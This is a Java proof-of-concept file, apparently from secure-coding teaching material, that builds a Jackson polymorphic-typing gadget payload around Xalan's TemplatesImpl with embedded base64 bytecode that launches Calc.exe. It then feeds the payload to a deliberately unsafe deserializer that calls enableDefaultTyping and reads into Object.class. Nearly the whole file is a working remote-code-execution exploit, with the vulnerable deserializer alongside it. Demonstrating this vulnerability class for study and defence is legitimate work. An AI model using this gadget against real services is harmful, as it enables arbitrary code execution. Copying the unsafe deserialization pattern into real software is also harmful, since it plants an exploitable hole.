// The MIT License (MIT)
// Copyright (c) 2017 Moritz Bechler
// Copyright (c) 2018 Robert C. Seacord
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

package jackson;

import com.fasterxml.jackson.databind.ObjectMapper;

import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.Properties;

import javassist.CannotCompileException;
import javassist.NotFoundException;
import ser05j.Reflections;

import java.util.Base64;
import java.util.Map.Entry;

public class Cage {

  private static Object deserialize(String data) throws IOException {
    ObjectMapper mapper = new ObjectMapper();
    mapper.enableDefaultTyping();
    // deserialize as Object or permissive tag interfaces such as java.io.Serializable
    return mapper.readValue(data, Object.class);
  }

  private static String quoteString(String string) {
    return '"' + string + '"';
  }

  private static void writeProperty(StringBuilder sb, String key, String value) {
    sb.append('"').append(key).append('"');
    sb.append(':');
    sb.append(value);
  }

  private static String writeObject(String type, Map<String, String> properties) {
    StringBuilder sb = new StringBuilder();
    sb.append('[');
    sb.append('"').append(type).append('"');
    sb.append(',');
    sb.append('{');
    boolean first = true;
    for (Entry<String, String> e : properties.entrySet()) {
      if (!first) {
        sb.append(',');
      } else {
        first = false;
      }
      writeProperty(sb, e.getKey(), e.getValue());
    }
    sb.append('}');
    sb.append(']');
    return sb.toString();
  }

  private static String writeArray(String... elements) {
    StringBuilder sb = new StringBuilder();
    sb.append('[');
    boolean first = true;
    for (String elem : elements) {
      if (!first) {
        sb.append(',');
      } else {
        first = false;
      }
      sb.append(elem);
    }
    sb.append(']');
    return sb.toString();
  }

  public static String rcePayload() throws
      IllegalAccessException, ClassNotFoundException, InstantiationException, CannotCompileException,
      NotFoundException, IOException, NoSuchFieldException, NoSuchMethodException, InvocationTargetException {
    String[] args = {"Calc.exe"};
    Object tpl = TemplatesUtil.createTemplatesImpl(args);
    byte[][] bytecodes = (byte[][]) Reflections.getFieldValue(tpl, "_bytecodes");
    Map<String, String> values = new LinkedHashMap<>();
    String base64 = Base64.getEncoder().encodeToString(bytecodes[0]);
    values.put("transletBytecodes", writeArray(quoteString(base64)));
    values.put("transletName", quoteString("foo"));
    values.put("outputProperties", "{}");
    if (Boolean.parseBoolean(System.getProperty("upstreamXalan", "false"))) {
      return writeObject("org.apache.xalan.xsltc.trax.TemplatesImpl", values);
    }
    return writeObject("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl", values);
  }

  public static void main(String[] args) throws
      IllegalAccessException, ClassNotFoundException, InstantiationException, CannotCompileException,
      NotFoundException, IOException, NoSuchFieldException, NoSuchMethodException, InvocationTargetException {
    Properties props = System.getProperties();
    props.setProperty("upstreamXalan", "false");

    // Writes gadget by hand and then deserializes using unmarshal
    String json = rcePayload();
    System.out.println(json);
    Object obj = deserialize(json);
    Class cls = obj.getClass();
    System.out.println("The type of the object is: " + cls.getName());
    System.out.println(obj);
  }

} // end class Cage
